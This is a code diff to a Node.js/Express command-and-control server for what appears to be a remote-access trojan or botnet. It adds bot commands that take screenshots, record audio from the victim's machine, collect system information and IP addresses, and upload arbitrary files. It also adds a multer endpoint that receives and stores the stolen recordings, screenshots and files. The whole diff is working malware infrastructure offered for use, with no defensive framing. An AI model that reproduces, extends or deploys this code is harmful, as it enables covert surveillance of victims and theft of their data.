@@ -1,6 +1,44 @@
 const express = require("express");
+const multer = require("multer");
 const {Channel} = require("./channel");
-const {Idle, Ping, Announce} = require("./commands")
+const {Idle, UploadFile, Ping, Announce, Screenshot, GetSysInfo, GetPublicIp, GetPrivateIp, AudioCapture} = require("./commands")
+
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, 'uploads/');
+    },
+    filename: (req, file, cb) => {
+        console.log(JSON.stringify(req.body))
+
+        // notify for file received in the correct channel
+        const currentChannel = channels.find((channel) => channel.botId === req.body.botId)
+
+        if (!currentChannel) {
+            console.log("No channel found for the req.")
+            cb(null, null)
+        }
+
+        if (req.body.uploadType === "audio") {
+            const filename = "audio-" + Date.now() + '-' + file.originalname
+            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "audio"})
+            cb(null, filename);
+        } else if (req.body.uploadType === "screen") {
+            const filename = "screen-" + Date.now() + '-' + file.originalname
+            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "screen"})
+            cb(null, Date.now() + '-' + filename);
+        }
+        else {
+            const filename = "file-" + Date.now() + '-' + file.originalname
+            currentChannel.messages.push({ "message" : "File received", "upload" : filename, "uploadType" : "file"})
+            cb(null, filename);
+        }
+    }
+});
+
+// Create the multer instance
+const upload = multer({ storage: storage });
+
+
 const app = express();
 const port = 3000;
 
@@ -35,11 +73,50 @@ function sendCommand(command) {
             targetChannel.commands.push(pingCommand)
             break
 
+        case "Screenshot":
+            console.log("Adding Screenshot command")
+            const screenshotCommand = new Screenshot()
+            targetChannel.commands.push(screenshotCommand)
+            break
+
+        case "AudioCapture":
+            console.log("Audio capture command")
+            const audioCaptureCommand = new AudioCapture({length : command.args.length, path: command.args.path})
+            targetChannel.commands.push(audioCaptureCommand)
+            break
+
+        case "GetSysInfo":
+            console.log("Adding GetSysInfo command")
+            const sysInfoCommand = new GetSysInfo()
+            targetChannel.commands.push(sysInfoCommand)
+            break
+
+        case "UploadFile":
+            console.log("Adding UploadFile command")
+            const uploadCommand = new UploadFile({path: command.args.path})
+            targetChannel.commands.push(uploadCommand)
+            break
+
+        case "GetPublicIp":
+            console.log("Adding GetPublicIp command")
+            const publicCommand = new GetPublicIp()
+            targetChannel.commands.push(publicCommand)
+            break
+
+        case "GetPrivateIp":
+            console.log("Adding GetPrivateIp command")
+            const privateCommand = new GetPrivateIp()
+            targetChannel.commands.push(privateCommand)
+            break
+
     }
 }
 
-function popCommand() {
-    const targetChannel = channels.find((channel) => channel.botId === command.botId)
+function popCommand(botId) {
+    const targetChannel = channels.find((channel) => channel.botId === botId)
+    if (!targetChannel) {
+        sendCommand(new Idle())
+    }
     targetChannel.commands.shift()
 }
 
@@ -64,6 +141,14 @@ function getCommands(botId) {
     return JSON.stringify(idleCommand)
 }
 
+function addChannelMessage(botId, message) {
+    const targetChannel = channels.find((channel) => channel.botId === botId)
+    if (targetChannel) {
+        console.log("Adding message to channel.")
+        targetChannel.messages.push(message)
+    }
+
+}
 
 /* ADMIN routes  */ 
 
@@ -82,7 +167,15 @@ app.post("/backend/commands", (req, res) => {
 });
 
 app.get("/backend/commands", (req, res) => {
-    res.send(JSON.stringify(commands));
+
+
+    const allCommands = {}
+
+    channels.forEach((channel) => {
+        allCommands[channel.botId] = channel.commands
+    })
+
+    res.send(JSON.stringify(allCommands));
 });
 
 app.get("/backend/channels", (req, res) => {
@@ -93,11 +186,17 @@ app.get("/backend/channels", (req, res) => {
 
 
 /* --- PUBLIC --- */ 
-app.post("/", (req, res) => {
+app.post("/",  upload.single('file'), (req, res) => {
     console.log("receiving a POST request from : " + req.ip);
     console.log("request body : " + JSON.stringify(req.body));
 
-    const payload = req.body; 
+    const payload = req.body;
+
+    if (req.body.uploadType) {
+        console.log("Received file.")
+        res.send("OK");
+        return;
+    }
 
     if (payload.name === "ANNOUNCE") {
         registerBot({ id: payload.id, name: payload.name, status: "online"});
@@ -116,8 +215,9 @@ app.post("/", (req, res) => {
         console.log("command result from bot : " + payload.id);
         console.log("command result : " + payload.result);
         console.log(payload.result)
+
         popCommand(payload.id)
-        
+        addChannelMessage(payload.id, payload.result)
 
     } else {
         console.log("unknown request");
